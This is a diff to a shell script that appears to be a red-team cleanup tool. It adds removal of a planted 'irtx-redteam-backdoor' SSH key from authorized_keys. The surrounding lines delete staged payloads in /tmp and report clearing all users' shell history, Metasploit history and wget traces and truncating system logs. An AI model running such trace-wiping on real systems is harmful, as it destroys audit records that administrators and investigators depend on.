@@ -100,6 +100,13 @@ rm -f /tmp/*.sh /tmp/*.elf /tmp/*.txt /tmp/*.rc 2>/dev/null
 echo -e "  ${GREEN}[+] /tmp cleaned${RESET}"
 echo ""
 
+# --- Remove backdoor key from target ---
+echo -e "${MAGENTA}[>] Removing backdoor key from authorized_keys ...${RESET}"
+sed -i '/irtx-redteam-backdoor/d' /root/.ssh/authorized_keys 2>/dev/null
+sed -i '/irtx-redteam-backdoor/d' /home/*/.ssh/authorized_keys 2>/dev/null
+echo -e "  ${GREEN}[+] Backdoor key removed.${RESET}"
+echo ""
+
 # --- System logs ---
 echo -e "${MAGENTA}[>] Clearing System Logs ...${RESET}"
 LOGS=(
@@ -142,6 +149,7 @@ echo -e "  ${YELLOW}Shell history :${RESET} Cleared (bash + zsh, all users)"
 echo -e "  ${YELLOW}MSF history   :${RESET} Cleared"
 echo -e "  ${YELLOW}wget traces   :${RESET} Removed"
 echo -e "  ${YELLOW}/tmp          :${RESET} Cleaned"
+echo -e "  ${YELLOW}Backdoor key  :${RESET} Removed from authorized_keys"
 echo -e "  ${YELLOW}System logs   :${RESET} Truncated"
 echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
 echo ""
